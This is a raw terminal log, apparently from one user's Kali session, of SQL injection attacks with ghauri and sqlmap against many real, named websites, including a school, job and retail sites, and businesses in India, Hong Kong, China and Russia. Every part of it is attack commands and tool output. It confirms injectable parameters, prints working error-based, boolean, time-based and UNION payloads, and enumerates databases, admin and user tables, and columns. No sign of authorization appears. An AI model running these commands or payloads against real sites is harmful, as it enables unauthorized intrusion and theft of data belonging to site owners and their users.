+    Payload: id=9&time=2025-2026 AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)-- wXyW&page=0
+---
+there were multiple injection points, please select the one to use for following injections:
+[0] place: GET, parameter: id  (default)
+[1] place: GET, parameter: time
+[q] Quit
+> 0
+
+[03:46:01] [INFO] testing MySQL
+[03:46:01] [INFO] confirming MySQL
+[03:46:01] [INFO] the back-end DBMS is MySQL
+[03:46:01] [INFO] fetching database names
+[03:46:01] [INFO] fetching number of databases
+[03:46:03] [INFO] retrieved: 4
+[03:46:08] [INFO] retrieved: information_schema
+[03:46:11] [INFO] retrieved: stjohn
+[03:46:14] [INFO] retrieved: test
+[03:46:17] [INFO] retrieved: test_demo
+available databases [4]:
+[*] information_schema
+[*] stjohn
+[*] test
+[*] test_demo
+
+[03:46:17] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.skhsjtst.edu.hk'
+
+[*] ending @ 03:46:17 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+
+
+
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://99builders.in/project-details.php?id=24" --dbs     
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 04:16:15 /2025-11-29/
+
+[04:16:15] [INFO] testing connection to the target URL
+[04:16:19] [INFO] testing if the target URL content is stable
+[04:16:21] [INFO] target URL content is stable
+[04:16:23] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[04:16:23] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[04:16:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[04:16:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[04:17:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[04:17:25] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[04:17:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[04:17:42] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[04:17:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[04:17:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[04:17:46] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[04:17:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[04:17:57] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[04:18:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[04:18:28] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[04:18:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[04:18:55] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=24 AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=24 AND 02939=2939-- wXyW
+---
+[04:19:48] [INFO] testing MySQL
+[04:19:48] [INFO] confirming MySQL
+[04:19:48] [INFO] the back-end DBMS is MySQL
+[04:19:48] [INFO] fetching database names
+[04:19:48] [INFO] fetching number of databases
+[04:19:52] [INFO] retrieved: 2
+[04:19:56] [INFO] retrieved: information_schema
+[04:19:58] [INFO] retrieved: builders_new_db
+available databases [2]:
+[*] information_schema
+[*] builders_new_db
+
+[04:19:58] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/99builders.in'
+
+[*] ending @ 04:19:58 /2025-11-29/
+
+                                         
+                                         
+                                         
+                                         
+                                         ┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.wzbio.com.cn/plasmidGrna.php?id=1&cid=5" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:47:05 /2025-11-29/
+
+[03:47:05] [INFO] testing connection to the target URL
+Ghauri resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=1 AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)-- wXyW&cid=5
+---
+[03:47:08] [INFO] testing MySQL
+[03:47:08] [INFO] confirming MySQL
+[03:47:08] [INFO] the back-end DBMS is MySQL
+[03:47:08] [INFO] fetching database names
+[03:47:08] [INFO] fetching number of databases
+[03:47:11] [INFO] retrieved: 0
+[03:47:11] [WARNING] the SQL query provided does not return any output
+[03:47:11] [ERROR] unable to retrieve the number of databases
+[03:47:11] [INFO] fetching current database
+[03:47:13] [INFO] resumed: '\'
+current database: '\'
+
+[03:47:13] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.wzbio.com.cn'
+
+[*] ending @ 03:47:13 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.revel.com.hk/en/product.php?id=%3Bid&pid=%3Bid" --dbs                                                                                       
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:03:02 /2025-11-29/
+
+[02:03:04] [INFO] testing connection to the target URL
+[02:03:05] [INFO] testing if the target URL content is stable
+[02:03:07] [INFO] target URL content is stable
+[02:03:08] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:03:08] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:03:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:03:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:04:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:04:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:04:30] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:04:44] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:04:58] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:05:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:05:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:05:39] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:05:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:06:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[02:06:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:06:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:07:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:07:18] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:07:21] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+[02:07:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:07:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[02:07:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[02:07:28] [INFO] testing 'Boolean-based blind - Parameter replace'
+[02:07:31] [INFO] GET parameter 'id' appears to be 'Boolean-based blind - Parameter replace' injectable
+[02:07:31] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:07:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:07:43] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:08:05] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 189 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=;id AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)-- wXyW&pid=;id AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)-- wXyW
+
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace
+    Payload: id=(SELECT (CASE WHEN (02935=2935) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))&pid=(SELECT (CASE WHEN (02935=2935) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(9),0)&pid=if(now()=sysdate(),SLEEP(9),0)
+---
+[02:09:03] [INFO] testing MySQL
+[02:09:03] [INFO] confirming MySQL
+[02:09:03] [INFO] the back-end DBMS is MySQL
+[02:09:03] [INFO] fetching database names
+[02:09:03] [INFO] fetching number of databases
+[02:09:04] [INFO] retrieved: 0
+[02:09:04] [WARNING] the SQL query provided does not return any output
+[02:09:04] [ERROR] unable to retrieve the number of databases
+[02:09:04] [INFO] fetching current database
+[02:09:07] [INFO] retrieved: '\'
+current database: '\'
+
+[02:09:07] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.revel.com.hk'
+
+[*] ending @ 02:09:07 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.aarontech.in/non-it/product-detail.php?id=29" --dbs            admin pannel                http://aarontech.in:2082/                 
+
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:17:42 /2025-11-29/
+
+[02:17:42] [INFO] testing connection to the target URL
+Ghauri resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=29 OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=29 OR NOT 02862=2862-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (CASE STATEMENT)
+    Payload: id=(SELECT CASE WHEN(1234=1234) THEN SLEEP(6) ELSE 0 END)
+---
+[02:17:44] [INFO] testing MySQL
+[02:17:44] [INFO] confirming MySQL
+[02:17:44] [INFO] the back-end DBMS is MySQL
+[02:17:44] [INFO] fetching database names
+[02:17:44] [INFO] fetching number of databases
+[02:17:45] [INFO] retrieved: 2
+[02:17:46] [INFO] resumed: information_schema 
+[02:17:46] [INFO] resumed: vspaaron_nonit 
+available databases [2]:
+[*] information_schema
+[*] vspaaron_nonit
+
+[02:17:46] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.aarontech.in'
+
+[*] ending @ 02:17:46 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+──(unknonehart㉿unknone)-[~/Desktop]
+└─$  ghauri -u "http://myfuturejob.in/service_detail.php?id=7%27" -D myfuture_db1 --tables --random-agent 
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:19:14 /2025-11-29/
+
+[02:19:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:131.0) Gecko/20100101 Firefox/131.0'
+[02:19:15] [INFO] testing connection to the target URL
+[02:19:15] [INFO] testing if the target URL content is stable
+[02:19:16] [WARNING] target URL content is not stable (i.e. content differs). Ghauri will base the page comparison on a textual content, Switching to 'text-only'
+[02:19:17] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[02:19:17] [INFO] testing for SQL injection on GET parameter 'id'
+[02:19:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[02:19:23] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="who")
+[02:19:23] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+[02:19:31] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[02:19:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[02:19:35] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[02:19:45] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+[02:19:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:19:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:19:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[02:19:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:19:47] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 19 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=7' AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)-- wXyW
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=7' AND 06361=6361-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=7' AND if(now()=sysdate(),SLEEP(8),0)-- wXyW
+---
+[02:20:02] [INFO] testing MySQL
+[02:20:02] [INFO] confirming MySQL
+[02:20:02] [INFO] the back-end DBMS is MySQL
+[02:20:02] [INFO] fetching tables for database: myfuture_db1
+[02:20:02] [INFO] fetching number of tables for database 'myfuture_db1'
+[02:20:02] [INFO] retrieved: 33
+[02:20:04] [INFO] retrieved: tb_currency
+[02:20:05] [INFO] retrieved: tbl_admin
+[02:20:06] [INFO] retrieved: tbl_admin_login
+[02:20:07] [INFO] retrieved: tbl_applyedjob
+[02:20:08] [INFO] retrieved: tbl_city
+[02:20:09] [INFO] retrieved: tbl_configuration
+[02:20:10] [INFO] retrieved: tbl_country
+[02:20:12] [INFO] retrieved: tbl_course
+[02:20:12] [INFO] retrieved: tbl_emp_company
+[02:20:13] [INFO] retrieved: tbl_employee
+[02:20:14] [INFO] retrieved: tbl_employer
+[02:20:15] [INFO] retrieved: tbl_functional_area
+[02:20:16] [INFO] retrieved: tbl_industries
+[02:20:16] [INFO] retrieved: tbl_learning
+[02:20:17] [INFO] retrieved: tbl_match_job
+[02:20:19] [INFO] retrieved: tbl_news
+[02:20:19] [INFO] retrieved: tbl_order_res_pack
+[02:20:20] [INFO] retrieved: tbl_order_service
+[02:20:21] [INFO] retrieved: tbl_postjob
+[02:20:22] [INFO] retrieved: tbl_postjob_courses
+[02:20:22] [INFO] retrieved: tbl_postjob_locations
+[02:20:23] [INFO] retrieved: tbl_resume_package
+[02:20:24] [INFO] retrieved: tbl_role
+[02:20:24] [INFO] retrieved: tbl_service
+[02:20:25] [INFO] retrieved: tbl_settings
+[02:20:26] [INFO] retrieved: tbl_specialization
+[02:20:26] [INFO] retrieved: tbl_state
+[02:20:27] [INFO] retrieved: tbl_static_page
+[02:20:29] [INFO] retrieved: tbl_suggestion
+[02:20:29] [INFO] retrieved: tbl_template
+[02:20:30] [INFO] retrieved: tbl_university
+[02:20:31] [INFO] retrieved: tbl_user
+[02:20:32] [INFO] retrieved: tbl_view_profile
+Database: myfuture_db1
+[33 tables]
++-----------------------+
+| tbl_industries        |
+| tbl_view_profile      |
+| tbl_role              |
+| tbl_functional_area   |
+| tbl_static_page       |
+| tbl_order_res_pack    |
+| tbl_emp_company       |
+| tbl_admin_login       |
+| tbl_employer          |
+| tbl_configuration     |
+| tbl_suggestion        |
+| tbl_settings          |
+| tbl_employee          |
+| tbl_admin             |
+| tbl_postjob_courses   |
+| tbl_university        |
+| tbl_template          |
+| tbl_state             |
+| tbl_service           |
+| tbl_specialization    |
+| tbl_country           |
+| tbl_postjob           |
+| tbl_postjob_locations |
+| tbl_applyedjob        |
+| tb_currency           |
+| tbl_course            |
+| tbl_order_service     |
+| tbl_user              |
+| tbl_match_job         |
+| tbl_news              |
+| tbl_city              |
+| tbl_resume_package    |
+| tbl_learning          |
++-----------------------+
+
+[02:20:32] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/myfuturejob.in'
+
+[*] ending @ 02:20:32 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://sushikkha.in/view_more.php?id=" -D u661805974_sushikkha -T purchase_order_list  --colum --threads=4 --batch 
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:20:07 /2025-11-29/
+
+[02:20:07] [INFO] testing connection to the target URL
+Ghauri resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)
+
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace
+    Payload: id=(SELECT (CASE WHEN (06226=6226) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (CASE STATEMENT)
+    Payload: id=(SELECT CASE WHEN(1234=1234) THEN SLEEP(5) ELSE 0 END)
+---
+[02:20:10] [INFO] testing MySQL
+[02:20:10] [INFO] confirming MySQL
+[02:20:10] [INFO] the back-end DBMS is MySQL
+[02:20:10] [INFO] fetching columns for table 'purchase_order_list' in database 'u661805974_sushikkha'
+[02:20:10] [INFO] fetching number of columns for table 'purchase_order_list' in database 'u661805974_sushikkha'
+[02:20:12] [INFO] retrieved: 13
+[02:20:13] [INFO] resumed: id 
+[02:20:13] [INFO] resumed: invoice 
+[02:20:13] [INFO] resumed: list 
+[02:20:13] [INFO] resumed: product_id 
+[02:20:13] [INFO] resumed: old_stock 
+[02:20:13] [INFO] resumed: p_qty 
+[02:20:13] [INFO] resumed: mrp 
+[02:20:13] [INFO] resumed: discount 
+[02:20:13] [INFO] resumed: p_price 
+[02:20:13] [INFO] resumed: sale_price 
+[02:20:13] [INFO] resumed: total_purchase_price 
+[02:20:13] [INFO] resumed: supplier 
+[02:20:13] [INFO] resumed: date 
+Database: u661805974_sushikkha
+Table: purchase_order_list
+[13 columns]
++----------------------+
+| id                   |
+| invoice              |
+| list                 |
+| product_id           |
+| old_stock            |
+| p_qty                |
+| mrp                  |
+| discount             |
+| p_price              |
+| sale_price           |
+| total_purchase_price |
+| supplier             |
+| date                 |
++----------------------+
+
+[02:20:13] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/sushikkha.in'
+
+[*] ending @ 02:20:13 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ sqlmap -u "https://www.imtmatraining.com/brochure/mailer.php?id=25" --dbs         
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 02:20:33 /2025-11-29/
+
+[02:20:34] [INFO] resuming back-end DBMS 'mysql' 
+[02:20:35] [INFO] testing connection to the target URL
+[02:20:36] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=onkr6rlij86...2bd85hqok6'). Do you want to use those [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25' AND 5808=5808 AND 'rWCu'='rWCu
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=25' AND (SELECT 6004 FROM (SELECT(SLEEP(5)))VqmZ) AND 'UUav'='UUav
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 94 columns
+    Payload: id=-2372' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a766a71,0x756265764578664f5371436f4e54576764495a44786d496e4c73737a437a75435771484c624e6d70,0x7171787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[02:20:39] [INFO] the back-end DBMS is MySQL
+web application technology: Apache, PHP
+back-end DBMS: MySQL >= 5.0.12
+[02:20:39] [INFO] fetching database names
+available databases [3]:
+[*] imtmatra_neweb
+[*] imtmatra_temp
+[*] information_schema
+
+[02:20:40] [INFO] fetched data logged to text files under '/home/unknonehart/.local/share/sqlmap/output/www.imtmatraining.com'
+[02:20:40] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 02:20:40 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "http://www.variant-billiard.ru/goods.php?id=421" --dbs                        
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 02:27:33 /2025-11-29/
+
+[02:27:34] [INFO] testing connection to the target URL
+[02:27:35] [INFO] testing if the target URL content is stable
+[02:27:36] [INFO] target URL content is stable
+[02:27:37] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[02:27:37] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[02:28:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[02:28:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[02:29:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[02:29:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[02:29:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[02:29:36] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[02:29:50] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[02:30:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[02:30:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[02:30:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[02:30:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[02:30:52] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[02:31:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[02:31:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
